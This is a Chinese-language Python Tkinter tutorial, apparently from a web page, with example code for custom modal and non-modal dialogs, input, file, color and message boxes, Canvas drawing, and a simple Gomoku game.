不管是使用SimpleDialog还是Dialog,整个对话框的布局都是比较固定的,开发者只能为其指定title、text等选项,如果希望在对话框中添加其他组件,这就很难实现了。另外SimpleDialog和Dialog都是模式的。

如果开发者需要使用自定义的对话框,包括定制模式和非模式行为,则可通过继承Toplevel来实现。如果打算通过这种方式来实现自定义对话框,有两点要注意：
继承Toplevel来实现自定义对话框同样需要为对话框指定master。
程序可调用Toplevel的grab_set()方法让该对话框变成模式对话框,否则就是非模式对话框

</pre>在模式对话框没有关闭的情况下,该程序的主窗口将无法与用户交互,主窗口无法获得焦点<textarea>
from tkinter import *
from tkinter import ttk   # 导入ttk
from tkinter import messagebox
# 自定义对话框类,继承Toplevel
class MyDialog(Toplevel):
    # 定义构造方法
    def __init__(self, parent, title = None, modal=True):
        Toplevel.__init__(self, parent)
        self.transient(parent)
        if title: self.title(title)                    # 设置标题
        self.parent = parent
        self.result = None
        frame = Frame(self)                            # 创建对话框的主体内容
        self.initial_focus = self.init_widgets(frame)  # 调用init_widgets方法来初始化对话框界面
        frame.pack(padx=5, pady=5)
        self.init_buttons()                            # 调用init_buttons方法初始化对话框下方的按钮
        if modal: self.grab_set()                      # 根据modal选项设置是否为模式对话框
        if not self.initial_focus:
            self.initial_focus = self
        self.protocol("WM_DELETE_WINDOW", self.cancel_click)  # 为"WM_DELETE_WINDOW"协议使用self.cancel_click事件处理方法
        self.geometry("+%d+%d" % (parent.winfo_rootx()+50, parent.winfo_rooty()+50)) # 根据父窗口来设置对话框的位置
        print( self.initial_focus)
        self.initial_focus.focus_set()                 # 让对话框获取焦点
        self.wait_window(self)
    # 通过该方法来创建自定义对话框的内容
    def init_widgets(self, master):
        Label(master, text='用户名', font=12,width=10).grid(row=1, column=0)  # 创建并添加Label
        self.name_entry = Entry(master, font=16)                              # 创建并添加Entry,用于接受用户输入的用户名
        self.name_entry.grid(row=1, column=1)

        Label(master, text='密  码', font=12,width=10).grid(row=2, column=0)  # 创建并添加Label
        self.pass_entry = Entry(master, font=16)                              # 创建并添加Entry,用于接受用户输入的密码
        self.pass_entry.grid(row=2, column=1)
    # 通过该方法来创建对话框下方的按钮框
    def init_buttons(self):
        f = Frame(self)
        w = Button(f, text="确定", width=10, command=self.ok_click, default=ACTIVE)  # 创建"确定"按钮,位置绑定self.ok_click处理方法
        w.pack(side=LEFT, padx=5, pady=5)
        w = Button(f, text="取消", width=10, command=self.cancel_click)  # 创建"确定"按钮,位置绑定self.cancel_click处理方法
        w.pack(side=LEFT, padx=5, pady=5)
        self.bind("<Return>", self.ok_click)
        self.bind("<Escape>", self.cancel_click)
        f.pack()
    # 该方法可对用户输入的数据进行校验,可重写该方法
    def validate(self):
        return True
    # 该方法可处理用户输入的数据
    def process_input(self):
        user_name = self.name_entry.get()
        user_pass = self.pass_entry.get()
        messagebox.showinfo(message='用户输入的用户名: %s, 密码: %s' % (user_name , user_pass))
    def ok_click(self, event=None):
        print('确定')
        # 如果不能通过校验,让用户重新输入
        if not self.validate():
            self.initial_focus.focus_set()
            return
        self.withdraw()
        self.update_idletasks()
        self.process_input()    # 获取用户输入数据
        self.parent.focus_set() # 将焦点返回给父窗口
        self.destroy()          # 销毁自己
    def cancel_click(self, event=None):
        print('取消')
        self.parent.focus_set() # 将焦点返回给父窗口
        self.destroy()          # 销毁自己

class App:
    def __init__(self, master):
        self.master = master
        self.initWidgets()
    def initWidgets(self):
        ttk.Button(self.master, text='模式对话框',command=self.open_modal).pack(side=LEFT, ipadx=5, ipady=5, padx= 10)
        ttk.Button(self.master, text='非模式对话框',command=self.open_none_modal).pack(side=LEFT, ipadx=5, ipady=5, padx= 10)
    def open_modal(self):
        d = MyDialog(self.master, title='模式对话框') # 默认是模式对话框
    def open_none_modal(self):
        d = MyDialog(self.master, title='非模式对话框', modal=False)
root = Tk()
root.title("颜色对话框测试")
App(root)
root.mainloop()

</textarea><pre>
输入对话框
在simpledialog模块下还有如下便捷的工具函数,通过这些工具函数可以更方便地生成各种输入对话框：
askinteger：生成一个让用户输入整数的对话框。
askfloat：生成一个让用户输入浮点数的对话框。
askstring：生成一个让用户输入字符串的对话框。
上面三个工具函数的前两个参数分别指定对话框的标题和提示信息,后面还可以通过选项来设置对话框的初始值、最大值和最小值
这三个函数会返回用户输入的数据

</pre><textarea>
from tkinter import *
from tkinter import ttk  # 导入ttk
from tkinter import simpledialog  # 导入simpledialog
class App:
    def __init__(self, master):
        self.master = master
        self.initWidgets()
    def initWidgets(self):
        # 创建3个按钮,并为之绑定事件处理函数
        ttk.Button(self.master, text='输入整数对话框',command=self.open_integer).pack(side=LEFT, ipadx=5, ipady=5, padx= 10)
        ttk.Button(self.master, text='输入浮点数对话框',command=self.open_float).pack(side=LEFT, ipadx=5, ipady=5, padx= 10)
        ttk.Button(self.master, text='输入字符串对话框',command=self.open_string).pack(side=LEFT, ipadx=5, ipady=5, padx= 10)
    def open_integer(self):
         # 调用askinteger函数生成一个让用户输入整数的对话框
        print(simpledialog.askinteger("猜糖果", "你猜我手上有几个糖果:",initialvalue=3, minvalue=1, maxvalue=10))
    def open_float(self):
        # 调用askfloat函数生成一个让用户输入浮点数的对话框
        print(simpledialog.askfloat("猜体重", "你猜我我体重多少公斤:",initialvalue=27.3, minvalue=10, maxvalue=50))
    def open_string(self):
        # 调用askstring函数生成一个让用户输入字符串的对话框
        print(simpledialog.askstring("猜名字", "你猜我叫什么名字:",initialvalue='Charlie'))
root = Tk()
root.title("输入对话框测试")
App(root)
root.mainloop()

</textarea><pre>
文件对话框创建和使用
filedialog模块提供了各种用于生成文件对话框的工具函数,这些函数有些返回用户所选择文件的路径,有些直接返回用户所选择文件的输入/输出流：
askopenfile()：生成打开单个文件的对话框,返回所选择文件的文件流,程序可通过该文件流来读取文件内容。
askopenfiles()：生成打开多个文件的对话框,返回多个所选择文件的文件流组成的列表,程序可通过这些文件流来读取文件内容。
askopenfilename()：生成打开单个文件的对话框,返回所选择文件的文件路径。
askopenfilenames()：生成打开多个文件的对话框,返回多个所选择文件的文件路径组成的元组。
asksaveasfile()：生成保存文件的对话框,返回所选择文件的文件输出流,程序可通过该文件输出流向文件写入数据。
asksaveasfilename()：生成保存文件的对话框,返回所选择文件的文件路径。
askdirectory()：生成打开目录的对话框。

上面的用于生成打开文件的对话框的工具函数支持如下选项：
defaultextension：指定默认扩展名。当用户没有输入扩展名时系统会默认添加该选项指定的扩展名。
filetypes：指定在该文件对话框中能查看的文件类型。该选项值是一个序列,可指定多个文件类型。可以通过"*"指定浏览所有文件。
initialdir：指定初始打开的目录。
initialfile：指定所选择的文件。
parent：指定该对话框的属主窗口。
title：指定对话框的标题。
multiple：指定是否允许多选。

对于打开目录的对话框,还额外支持一个mustexist选项,该选项指定是否只允许打开己存在的目录。

通过 filedialog 模块下的工具函数打开的文件对话框依赖所在的平台,因此在不同的平台上看到的文件对话框是不同的

</pre><textarea>
from tkinter import *
from tkinter import ttk  # 导入ttk
from tkinter import filedialog  # 导入filedialog
class App:
    def __init__(self, master):
        self.master = master
        self.initWidgets()
    def initWidgets(self):
        # 创建7个按钮,并为之绑定事件处理函数
        ttk.Button(self.master, text='打开单个文件', command=self.open_file).pack(side=LEFT, ipadx=5, ipady=5, padx= 10)
        ttk.Button(self.master, text='打开多个文件', command=self.open_files).pack(side=LEFT, ipadx=5, ipady=5, padx= 10)
        ttk.Button(self.master, text='获取单个打开文件的文件名', command=self.open_filename).pack(side=LEFT, ipadx=5, ipady=5, padx= 10)
        ttk.Button(self.master, text='获取多个打开文件的文件名', command=self.open_filenames).pack(side=LEFT, ipadx=5, ipady=5, padx= 10)
        ttk.Button(self.master, text='获取保存文件', command=self.save_file).pack(side=LEFT, ipadx=5, ipady=5, padx= 10)
        ttk.Button(self.master, text='获取保存文件的文件名', command=self.save_filename).pack(side=LEFT, ipadx=5, ipady=5, padx= 10)
        ttk.Button(self.master, text='打开路径', command=self.open_dir).pack(side=LEFT, ipadx=5, ipady=5, padx= 10)
    def open_file(self):
        # 调用askopenfile方法获取单个打开的文件
        print(filedialog.askopenfile(title='打开单个文件', filetypes=[("文本文件", "*.txt"), ('Python源文件', '*.py')], initialdir='g:/'))
    def open_files(self):
        # 调用askopenfile方法获取多个打开的文件
        print(filedialog.askopenfiles(title='打开多个文件', filetypes=[("文本文件", "*.txt"), ('Python源文件', '*.py')], initialdir='g:/'))
    def open_filename(self):
        # 调用askopenfilename方法获取单个文件的文件名
        print(filedialog.askopenfilename(title='打开单个文件', filetypes=[("文本文件", "*.txt"), ('Python源文件', '*.py')], initialdir='g:/'))
    def open_filenames(self):
        # 调用askopenfilenames方法获取多个文件的文件名
        print(filedialog.askopenfilenames(title='打开多个文件', filetypes=[("文本文件", "*.txt"), ('Python源文件', '*.py')], initialdir='g:/'))
    def save_file(self):
        # 调用asksaveasfile方法保存文件
        print(filedialog.asksaveasfile(title='保存文件', filetypes=[("文本文件", "*.txt"), ('Python源文件', '*.py')], initialdir='g:/'))
    def save_filename(self):
        # 调用asksaveasfilename方法获取保存文件的文件名
        print(filedialog.asksaveasfilename(title='保存文件', filetypes=[("文本文件", "*.txt"), ('Python源文件', '*.py')], initialdir='g:/'))
    def open_dir(self):
        # 调用askdirectory方法打开目录
        print(filedialog.askdirectory(title='打开目录', initialdir='g:/'))
root = Tk()
root.title("文件对话框测试")
App(root)
root.mainloop()

</textarea><pre>
askcolor颜色选择对话框
colorchooser模块下提供了用于生成颜色选择对话框的askcolor()工具函数,为该工具函数可指定如下选项：
parent：指定该对话框的属主窗口。
title：指定该对话框的标题。
color：指定该对话框初始选择的颜色。

</pre><textarea>
from tkinter import *
from tkinter import ttk  # 导入ttk
from tkinter import colorchooser  # 导入colorchooser
class App:
    def __init__(self, master):
        self.master = master
        self.initWidgets()
    def initWidgets(self):
        # 创建1个按钮,并为之绑定事件处理函数
        ttk.Button(self.master, text='选择颜色', command=self.choose_color).pack(side=LEFT, ipadx=5, ipady=5, padx= 10)
    def choose_color(self):
        # 调用askcolor函数获取选中的颜色
        print(colorchooser.askcolor(parent=self.master, title='选择画笔颜色',color = 'blue')) # 初始颜色
root = Tk()
root.title("颜色对话框测试")
App(root)
root.mainloop()

</textarea><pre>
【 messageBox 】
messagebox模块提供了大量工具函数来生成各种消息框
用于显示应用程序的消息框,Python2中为tkMessagebox,其实就是平时看到的弹窗。首先需要定义一个触发功能来触发这个弹窗,这里就放上button按钮通过触发功能调用messagebox,点击button按钮就会弹出提示对话框。下面给出messagebox提示信息的几种形式：

tkinter.messagebox.showinfo(title='Hi', message='你好！')            # 提示信息对话窗
tkinter.messagebox.showwarning(title='Hi', message='有警告！')       # 提出警告对话窗
tkinter.messagebox.showerror(title='Hi', message='出错了！')         # 提出错误对话窗
print(tkinter.messagebox.askquestion(title='Hi', message='你好！'))  # 询问选择对话窗return 'yes', 'no'
print(tkinter.messagebox.askyesno(title='Hi', message='你好！'))     # return 'True', 'False'
print(tkinter.messagebox.askokcancel(title='Hi', message='你好！'))  # return 'True', 'False'

默认调用messagebox的工具函数时只要设置提示区的字符串即可,图标区的图标、按钮区的按钮都有默认设置,可通过如下两个选项来定制图标和按钮：
icon：定制图标的选项。该选项支持"error"、"info"、"question"、"warning"这几个选项值。
type：定制按钮的选项。该选项支持"abortretryignore"(取消、重试、忽略)、"ok"(确定)、"okcancel"(确定、取消)、"retrycancel"(重试、取消)、"yesno"(是、否)、"yesnocancel"(是、否、取消)这些选项值。

</pre><textarea>
import tkinter as tk  # 使用Tkinter前需要先导入
import tkinter.messagebox  # 要使用messagebox先要导入模块

window = tk.Tk()            # 实例化object,建立窗口window
window.title('My Window')   # 给窗口的可视化起名字
window.geometry('500x300')  # 设定窗口的大小(长 * 宽),这里的乘是小x

# 定义触发函数功能
def hit_me():
    tkinter.messagebox.showinfo(title='Hi', message='你好！')

tk.Button(window, text='hit me', bg='green', font=('Arial', 14), command=hit_me).pack()
window.mainloop()  # 主窗口循环显示

</textarea><textarea>
from tkinter import *
from tkinter import ttk  # 导入ttk
from tkinter import messagebox as msgbox   # 导入messagebox
class App:
    def __init__(self, master):
        self.master = master
        self.initWidgets()
    def initWidgets(self):
        #-----------创建第1个Labelframe,用于选择图标类型-----------
        topF = Frame(self.master)
        topF.pack(fill=BOTH)
        lf1 = ttk.Labelframe(topF, text='请选择图标类型')
        lf1.pack(side=LEFT, fill=BOTH, expand=YES, padx=10, pady=5)
        i = 0
        self.iconVar = IntVar()
        self.icons = [None, "error", "info", "question", "warning"]
        for icon in self.icons:
            Radiobutton(lf1, text = icon if icon is not None else '默认',value=i,variable=self.iconVar).pack(side=TOP, anchor=W)
            i += 1
        self.iconVar.set(0)

        #-----------创建第二个Labelframe,用于选择按钮类型-----------
        lf2 = ttk.Labelframe(topF, text='请选择按钮类型')
        lf2.pack(side=LEFT,fill=BOTH, expand=YES, padx=10, pady=5)
        i = 0
        self.typeVar = IntVar()
        self.types = [None, "abortretryignore", "ok", "okcancel", "retrycancel", "yesno", "yesnocancel"] # 定义所有按钮类型
        for tp in self.types:
            Radiobutton(lf2, text= tp if tp is not None else '默认',value=i,variable=self.typeVar).pack(side=TOP, anchor=W)
            i += 1
        self.typeVar.set(0)
        #-----------创建Frame,用于包含多个按钮来生成不同的消息框-----------
        bottomF = Frame(self.master)
        bottomF.pack(fill=BOTH)
        # 创建8个按钮,并为之绑定事件处理函数
        btn1 = ttk.Button(bottomF, text="showinfo", command=self.showinfo_clicked)
        btn1.pack(side=LEFT, fill=X, ipadx=5, ipady=5, pady=5, padx=5)
        btn2 = ttk.Button(bottomF, text="showwarning", command=self.showwarning_clicked)
        btn2.pack(side=LEFT, fill=X, ipadx=5, ipady=5, pady=5, padx=5)
        btn3 = ttk.Button(bottomF, text="showerror", command=self.showerror_clicked)
        btn3.pack(side=LEFT, fill=X, ipadx=5, ipady=5, pady=5, padx=5)
        btn4 = ttk.Button(bottomF, text="askquestion", command=self.askquestion_clicked)
        btn4.pack(side=LEFT, fill=X, ipadx=5, ipady=5, pady=5, padx=5)
        btn5 = ttk.Button(bottomF, text="askokcancel", command=self.askokcancel_clicked)
        btn5.pack(side=LEFT, fill=X, ipadx=5, ipady=5, pady=5, padx=5)
        btn6 = ttk.Button(bottomF, text="askyesno", command=self.askyesno_clicked)
        btn6.pack(side=LEFT, fill=X, ipadx=5, ipady=5, pady=5, padx=5)
        btn7 = ttk.Button(bottomF, text="askyesnocancel", command=self.askyesnocancel_clicked)
        btn7.pack(side=LEFT, fill=X, ipadx=5, ipady=5, pady=5, padx=5)
        btn8 = ttk.Button(bottomF, text="askretrycancel", command=self.askretrycancel_clicked)
        btn8.pack(side=LEFT, fill=X, ipadx=5, ipady=5, pady=5, padx=5)
    def showinfo_clicked(self):
        print(msgbox.showinfo("Info", "showinfo测试.", icon=self.icons[self.iconVar.get()], type=self.types[self.typeVar.get()]))
    def showwarning_clicked(self):
        print(msgbox.showwarning("Warning", "showwarning测试.", icon=self.icons[self.iconVar.get()], type=self.types[self.typeVar.get()]))
    def showerror_clicked(self):
        print(msgbox.showerror("Error", "showerror测试.", icon=self.icons[self.iconVar.get()], type=self.types[self.typeVar.get()]))
    def askquestion_clicked(self):
        print(msgbox.askquestion("Question", "askquestion测试.",icon=self.icons[self.iconVar.get()],type=self.types[self.typeVar.get()]))
    def askokcancel_clicked(self):
        print(msgbox.askokcancel("OkCancel", "askokcancel测试.",icon=self.icons[self.iconVar.get()],type=self.types[self.typeVar.get()]))
    def askyesno_clicked(self):
        print(msgbox.askyesno("YesNo", "askyesno测试.",icon=self.icons[self.iconVar.get()],type=self.types[self.typeVar.get()]))
    def askyesnocancel_clicked(self):
        print(msgbox.askyesnocancel("YesNoCancel", "askyesnocancel测试.",icon=self.icons[self.iconVar.get()],type=self.types[self.typeVar.get()]))
    def askretrycancel_clicked(self):
        print(msgbox.askretrycancel("RetryCancel", "askretrycancel测试.",icon=self.icons[self.iconVar.get()],type=self.types[self.typeVar.get()]))
root = Tk()
root.title("消息框测试")
App(root)
root.mainloop()

</textarea><pre>
【 Canvas 】
Tkinter提供了Canvas组件来实现绘图。程序既可在Canvas中绘制直线、矩形、椭圆等各种几何图形,也可绘制图片、文字、UI组件如Button等。Canvas允许重新改变这些图形项(Tkinter将程序绘制的所有东西统称为item)的属性,比如改变其坐标、外观等,创建图形编辑器,实现定制窗口部件。

Canvas的坐标系统是绘图的基础,点(0,0)位于Canvas组件的左上角,X轴水平向右延伸,Y轴垂直向下延伸

Canvas提供了如下方法来绘制各种图形：
create_rectangle()
绘制矩形,需指定两个点的坐标分别作为矩形左上角点和右下角点

create_oval()
绘制椭圆和圆,需指定两个点的坐标分别作为左上角点和右下角点来确定一个矩形,而该方法则负责绘制该矩形的内切椭圆,矩形确定下来该矩形的内切椭圆就能确定

create_arc()
绘制弧,和create_oval的用法相似,因为弧是椭圆的一部分,因此同样也是指定左上角和右下角两个点,默认绘制从0度即3点钟方向开始,逆时针旋转90°的那一段弧,可通过start改变起始角度,也可通过extent指定绘制弧的角度,style参数指定绘制弧的样式,支持PIESLICE(扇形)、CHORD(弓形)、ARC(仅绘制弧)选项值。

create_line()
绘制直线,需指定两个点的坐标分别作为直线的起点和终点

create_polygon()
绘制多边形,需指定多个点的坐标来作为多边形的多个定点

create_bitmap()
绘制位图,只要指定一个坐标点用于指定目标元素的绘制位置即可

create_image()
绘制图片,只要指定一个坐标点用于指定目标元素的绘制位置即可

create_text()
绘制文字,只要指定一个坐标点用于指定目标元素的绘制位置即可
justify参数指定文字的对齐方式,支持CENTER、LEFT、RIGHT常量值

create_window()
绘制组件,只要指定一个坐标点用于指定目标元素的绘制位置即可

在绘制这些图形时可指定如下选项：
width：指定边框宽度,默认1
fill：指定填充颜色,默认不填充
stipple：使用位图平铺进行填充,可与fill选项结合使用,fill选项用于指定位图的颜色。
outline：指定边框颜色
dash：指定边框使用虚线,可为单独的整数指定虚线中线段的长度,也可为形如(5,2,3)格式的元素,5指定虚线中线段的长度,2指定间隔长度,3指定虚线长度
joinstyle：指定直接连接点的风格,仅对绘制直线和多边形有效,支持METTER、ROUND、BEVEL选项值。
anchor：指定绘制文字、GUI组件的位置,仅对create_text()、create_window()方法有效。
arrow参数指定绘制直线时两端是否有箭头和箭头风格,支持NONE(两端无箭头)、FIRST(开始端有箭头)、LAST(结束端有箭头)、BOTH(两端都有箭头)选项值。
arrowshape参数指定箭头形状,该选项是一个形如"20 20 10"的字符串,字符串中的三个整数依次指定填充长度、箭头长度、箭头宽度。

</pre>滚动条需要将框架作为父框架,而不是画布<textarea>
from tkinter import *
root=Tk()
frame=Frame(root,width=300,height=300)
frame.grid(row=0,column=0)

canvas=Canvas(frame,bg='#FFFFFF',width=300,height=300,scrollregion=(0,0,500,500))

hbar=Scrollbar(frame,orient=HORIZONTAL)
hbar.pack(side=BOTTOM,fill=X)
hbar.config(command=canvas.xview)

vbar=Scrollbar(frame,orient=VERTICAL)
vbar.pack(side=RIGHT,fill=Y)
vbar.config(command=canvas.yview)

canvas.config(width=300,height=300)
canvas.config(xscrollcommand=hbar.set, yscrollcommand=vbar.set)
canvas.pack(side=LEFT,expand=True,fill=BOTH)

root.mainloop()

'''
默认它将尝试收缩(或增长)一个容器,以使其完全适合其子容器。因为滚动条是原始示例中画布的子元素,因此画布缩小以适合。
如果希望滚动条出现在画布中,诀窍是使用额外的框架。将画布和滚动条放置在这个内部框架中,关闭画布的边框并打开框架。将框架的背景设置为与画布相同,滚动条将显示在画布内
'''

</textarea><textarea>
from tkinter import *
root = Tk()
cv = Canvas(root, background='white')  # 创建并添加Canvas
cv.pack(fill=BOTH, expand=YES)
cv.create_rectangle(30, 30, 200, 200,
    outline='red',        # 边框颜色
    stipple = 'question', # 填充的位图
    fill="red",           # 填充颜色
    width=5               # 边框宽度
)
cv.create_oval(240, 30, 330, 200,
    outline='yellow',     # 边框颜色
    fill='pink',          # 填充颜色
    width=4               # 边框宽度
)
root.mainloop()

</textarea><textarea>
import tkinter as tk  # 使用Tkinter前需要先导入

window = tk.Tk()            # 实例化object,建立窗口window
window.title('My Window')   # 给窗口的可视化起名字
window.geometry('500x300')  # 设定窗口的大小(长 * 宽)

canvas = tk.Canvas(window, bg='green', height=200, width=500)         # 在图形界面上创建500 * 200大小的画布并放置各种元素
image_file = tk.PhotoImage(file='light.gif')                          # 图片位置,并导入图片到画布上
image = canvas.create_image(250, 0, anchor='n',image=image_file)      # 图片锚定点(n即north图片顶端的中间点位置)放在画布(250,0)坐标处
x0, y0, x1, y1 = 100, 100, 150, 150                                   # 定义多边形参数,然后在画布上画出指定图形
line = canvas.create_line(x0-50, y0-50, x1-50, y1-50)                 # 画直线
oval = canvas.create_oval(x0+120, y0+50, x1+120, y1+50, fill='yellow')# 画圆 用黄色填充
arc = canvas.create_arc(x0, y0+50, x1, y1+50, start=0, extent=180)    # 画扇形 从0度打开收到180度结束
rect = canvas.create_rectangle(330, 30, 330+20, 30+20)                # 画矩形正方形
canvas.pack()

def moveit():
    canvas.move(rect, 2, 2) # 移动正方形rect(也可以改成其他图形名字用以移动一起图形、元素),按每次(x=2, y=2)步长进行移动

b = tk.Button(window, text='move item',command=moveit).pack()         # 定义一个按钮用来移动指定图形的在画布上的位置

window.mainloop()  # 主窗口循环显示

</textarea><textarea>
from tkinter import *
root = Tk()
root.title('绘制图形项')

frame=Frame(root, width=830, height=830)
frame.grid(row=0,column=0)

cv = Canvas(root, background='white', width=830, height=830, scrollregion=(0,0,0,1000))
scroll = Scrollbar(root, orient=VERTICAL, command=cv.yview)
scroll.pack(side=RIGHT, fill=Y)
cv.configure(yscrollcommand=scroll.set)
cv.pack(fill=BOTH, expand=YES)

columnFont = ('微软雅黑', 18)
titleFont = ('微软雅黑', 20, 'bold')

# 使用循环绘制文字
for i, st in enumerate(['默认', '指定边宽', '指定填充', '边框颜色', '位图填充']):
    cv.create_text((130 + i * 140, 20),text = st,font = columnFont,fill='gray',anchor = W,justify = LEFT)

cv.create_text(10, 60, text = '绘制矩形',font = titleFont,fill='magenta',anchor = W,justify = LEFT)
options = [
    (None, None, None, None),
    (4, None, None, None),
    (4, 'pink', None, None),
    (4, 'pink', 'blue', None),
    (4, 'pink', 'blue', 'error')
]
for i, op in enumerate(options):
    cv.create_rectangle(130 + i * 140, 50, 240 + i * 140, 120,width = op[0],fill = op[1],outline = op[2],stipple = op[3])

cv.create_text(10, 160, text = '绘制椭圆',font = titleFont,fill='magenta',anchor = W,justify = LEFT)
options = [
    (None, None, None, None),
    (4, None, None, None),
    (4, 'pink', None, None),
    (4, 'pink', 'blue', None),
    (4, 'pink', 'blue', 'error')
]
for i, op in enumerate(options):
    cv.create_oval(130 + i * 140, 150, 240 + i * 140, 220,width = op[0],fill = op[1],outline = op[2],stipple = op[3])

cv.create_text(10, 260, text = '绘制多边形',font = titleFont,fill='magenta',anchor = W,justify = LEFT)
options = [(None, "", 'black', None),
    (4, "", 'black', None),
    (4, 'pink', 'black', None),
    (4, 'pink', 'blue', None),
    (4, 'pink', 'blue', 'error')]
for i, op in enumerate(options):
    cv.create_polygon(130 + i * 140, 320, 185 + i * 140, 250, 240 + i * 140, 320,
        width = op[0],fill = op[1],outline = op[2],stipple = op[3])

cv.create_text(10, 360, text = '绘制扇形',font = titleFont,fill='magenta',anchor = W,justify = LEFT)
options = [
    (None, None, None, None),
    (4, None, None, None),
    (4, 'pink', None, None),
    (4, 'pink', 'blue', None),
    (4, 'pink', 'blue', 'error')
]
for i, op in enumerate(options):
    cv.create_arc(130 + i * 140, 350, 240 + i * 140, 420, width = op[0],fill = op[1],outline = op[2],stipple = op[3])

cv.create_text(10, 460, text = '绘制弓形',font = titleFont,fill='magenta',anchor = W,justify = LEFT)
options = [
    (None, None, None, None),
    (4, None, None, None),
    (4, 'pink', None, None),
    (4, 'pink', 'blue', None),
    (4, 'pink', 'blue', 'error')
]
for i, op in enumerate(options):
    cv.create_arc(130 + i * 140, 450, 240 + i * 140, 520,
        width = op[0],fill = op[1],outline = op[2],stipple = op[3],start = 30,extent = 60,style = CHORD)

cv.create_text(10, 560, text = '仅绘弧',font = titleFont,fill='magenta',anchor = W,justify = LEFT)
options = [
    (None, None, None, None),
    (4, None, None, None),
    (4, 'pink', None, None),
    (4, 'pink', 'blue', None),
    (4, 'pink', 'blue', 'error')
]
for i, op in enumerate(options):
    cv.create_arc(130 + i * 140, 550, 240 + i * 140, 620,
        width = op[0],fill = op[1],outline = op[2],stipple = op[3],start = 30,extent = 60,style = ARC)

cv.create_text(10, 660, text = '绘制直线',font = titleFont,fill='magenta',anchor = W,justify = LEFT)
options = [(None, None, None, None, None),
    (6, None, None, BOTH, (20, 40, 10)),
    (6, 'pink', None, FIRST, (40, 40, 10)),
    (6, 'pink', None, LAST, (60, 50, 10)),
    (8, 'pink', 'error', None, None)]
for i, op in enumerate(options):
    cv.create_line(130 + i * 140, 650, 240 + i * 140, 720,width = op[0],fill = op[1],stipple = op[2],arrow = op[3],arrowshape = op[4])

cv.create_text(10, 760, text = '绘制位图\n图片\n组件',font = titleFont,fill='magenta',anchor = W,justify = LEFT)
funcs = [Canvas.create_bitmap, Canvas.create_image, Canvas.create_window]
# 为上面3个方法定义选项
items = [
    {'bitmap' : 'questhead'},
    {'image':PhotoImage(file='light.gif')},
    {'window':Button(cv,text = '单击我', padx=10, pady=5, command = lambda :print('按钮单击')),'anchor': W}
]
for i, func in enumerate(funcs):
    func(cv, 230 + i * 140, 780, **items[i])

root.mainloop()

</textarea><pre>
canvas实现五子棋游戏
控制台五子棋可在控制台打印游戏状态的,实际上程序完全可以在界面上绘制游戏状态,这样就能看到图形界面的五子棋了。
该五子棋还需要根据用户的鼠标动作来确定下棋坐标,因此程序会为游戏界面的< Button-1>(左键单击)、< Motion>(鼠标移动)、< Leave>(鼠标移出)事件绑定事件处理函数

</pre><textarea>
from tkinter import *
import random
BOARD_WIDTH = 535
BOARD_HEIGHT = 536
BOARD_SIZE = 15
# 定义棋盘坐标的像素值和棋盘数组之间的偏移距。
X_OFFSET = 21
Y_OFFSET = 23
# 定义棋盘坐标的像素值和棋盘数组之间的比率。
X_RATE = (BOARD_WIDTH - X_OFFSET * 2) / (BOARD_SIZE - 1)
Y_RATE = (BOARD_HEIGHT - Y_OFFSET * 2) / (BOARD_SIZE - 1)
BLACK_CHESS = "●"
WHITE_CHESS = "○"
board = []
# 把每个元素赋为"╋",代表无棋
for i in range(BOARD_SIZE) :
    row = ["╋"] * BOARD_SIZE
    board.append(row)
root = Tk()  # 创建窗口

root.resizable(width=False, height=False) # 禁止改变窗口大小
root.iconbitmap('images/fklogo.ico')      # 修改图标
root.title('五子棋')                       # 设置窗口标题
cv = Canvas(root, background='white', width=BOARD_WIDTH, height=BOARD_HEIGHT)
cv.pack()
bm = PhotoImage(file="images/board.png")
cv.create_image(BOARD_HEIGHT/2 + 1, BOARD_HEIGHT/2 + 1, image=bm)
selectedbm = PhotoImage(file="images/selected.gif")
# 创建选中框图片,但该图片默认不在棋盘中
selected = cv.create_image(-100, -100, image=selectedbm)
def move_handler(event):
    # 计算用户当前的选中点,并保证该选中点在0～14之间
    selectedX = max(0, min(round((event.x - X_OFFSET) / X_RATE), 14))
    selectedY = max(0, min(round((event.y - Y_OFFSET) / Y_RATE), 14))
    # 移动红色选择框
    cv.coords(selected,(selectedX * X_RATE + X_OFFSET,
        selectedY * Y_RATE + Y_OFFSET))
black = PhotoImage(file="images/black.gif")
white = PhotoImage(file="images/white.gif")
def click_handler(event):
    # 计算用户的下棋点,并保证该下棋点在0～14之间
    userX = max(0, min(round((event.x - X_OFFSET) / X_RATE), 14))
    userY = max(0, min(round((event.y - Y_OFFSET) / Y_RATE), 14))
    # 当下棋点没有棋子时,才能下棋子,用户才能下棋子
    if board[userY][userX] == "╋":
        cv.create_image(userX * X_RATE + X_OFFSET, userY * Y_RATE + Y_OFFSET,
            image=black)
        board[userY][userX] = "●"
        while(True):
            comX = random.randint(0, BOARD_SIZE - 1)
            comY = random.randint(0, BOARD_SIZE - 1)
            if board[comY][comX] == "╋": break  # 如果电脑要下棋的点没有棋子时才能让电脑下棋
        cv.create_image(comX * X_RATE + X_OFFSET, comY * Y_RATE + Y_OFFSET,
            image=white)
        board[comY][comX] = "○"
def leave_handler(event):
    cv.coords(selected, -100, -100)  # 将红色选中框移出界面

cv.bind('<Motion>', move_handler)    # 为鼠标移动事件绑定事件处理函数
cv.bind('<Button-1>', click_handler) # 为鼠标点击事件绑定事件处理函数
cv.bind('<Leave>', leave_handler)    # 为鼠标移出事件绑定事件处理函数
root.mainloop()

'''
上面程序先绘制了五子棋的棋盘,该棋盘就是一张预先准备好的图片,然后绘制选择框,当用户鼠标在棋盘上移动时,该选择框显示用户鼠标当前停留在哪个下棋点上。
随后程序调用了Canvas的coords()方法,该方法负责重设选择框的坐标。这是Tkinter绘图的特别之处,绘制好的每一个图形项都不是固定的,程序后面完全可以修改它们。因此程序将会控制选择框图片随着用户鼠标的移动而改变位置。
程序根据用户鼠标单击来绘制黑色棋子和白色棋子。在绘制黑色棋子和白色棋子的同时,也改变了底层代表棋盘状态的board列表的数据,这样即可记录下棋状态,从而让程序在后面可以根据board[]列表来判断胜负(本来这个功能在Charlie的程序中是有的,此处为了突出绘图的主题,作者删除了这部分)。另外,也可以加入人工智能,根据board[]列表来决定电脑的下棋点。
在上面这个程序中,电脑下棋采用的方式是随机下棋,因此下得比较"凌乱"。如果要让电脑下棋更加智能,则可通过简单的人工智能来实现,本教程暂不涉及
'''

</textarea><pre>
Canvas操作图形项的标签
Canvas通过create_xxx方法绘制图形项之后,这些图形项井不是完全静态的图形,每个图形项都是一个独立的对象,程序完全可以动态地修改、删除这些图形项。

